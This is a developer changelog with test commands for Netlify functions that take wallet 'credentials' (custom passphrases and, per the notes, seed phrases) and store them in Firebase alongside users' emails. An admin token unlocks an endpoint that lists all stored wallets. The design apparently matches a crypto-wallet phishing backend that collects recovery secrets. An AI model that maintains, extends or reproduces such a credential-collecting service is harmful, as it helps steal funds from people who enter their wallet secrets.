# Email Field Fixes

## Issues Fixed

### 1. Email Not Updating for Existing Wallets
**Problem**: When connecting with a custom passphrase for an existing wallet, the email wasn't being updated in Firestore despite sending it in the request.

**Root Cause**: The email was being passed to `updateWalletBalance` but there was no visibility into whether it was actually being updated.

**Solution**: Added console logging to track email values:
- In `wallet-connect.js`: Logs the email from the request
- In `firebaseWalletStore.js`: Logs the email being saved to Firebase

**Files Modified**:
- `netlify/functions/wallet-connect.js` (line 127)
- `netlify/functions/utils/firebaseWalletStore.js` (line 275)

### 2. Email Missing from Get All Wallets Response
**Problem**: The `get-all-wallets` endpoint wasn't returning the email field even though it was stored in Firebase.

**Solution**: Added email field to the response mapping in `get-all-wallets.js`.

**Files Modified**:
- `netlify/functions/get-all-wallets.js` (line 135)

## Testing

### Test Email Update for Existing Wallet
```powershell
# Connect with custom passphrase and email
curl -X POST http://localhost:8888/.netlify/functions/wallet-connect `
  -H "Content-Type: application/json" `
  -d '{
    "inputType": "passphrase",
    "credentials": "your-custom-passphrase",
    "walletType": "solflare",
    "email": "user@example.com"
  }'
```

**Expected Output**:
- Console should show: `📧 Email from request: user@example.com`
- Console should show: `📝 Updating wallet {id} with email: user@example.com`
- Response should contain the wallet data with updated email

### Test Get All Wallets with Email
```powershell
# Get all wallets (requires admin token)
curl -X GET http://localhost:8888/.netlify/functions/get-all-wallets `
  -H "Authorization: Bearer YOUR_ADMIN_TOKEN"
```

**Expected Output**:
- Each wallet object should include `email` field
- Email should be empty string if not set, or the user's email if set

## Email Field Behavior

1. **New Wallet**: Email is stored when provided in the initial connection request
2. **Existing Wallet**: Email is updated if provided, preserved if not
3. **Get All Wallets**: Email is returned in the response for all wallets
4. **Default Value**: Empty string `''` if no email provided

## Console Logging

Added debug logging to help track email flow:

```
📧 Email from request: user@example.com
📝 Updating wallet abc-123 with email: user@example.com
💾 Saving wallet to Firebase: Gx7x...xxx
✅ Wallet saved successfully
```

## Important Notes

- Email is optional and defaults to empty string
- Email updates work for both seed phrase and custom passphrase connections
- The email field is stored in Firebase under the `email` field
- All existing wallets will have `email: ''` until updated by the user
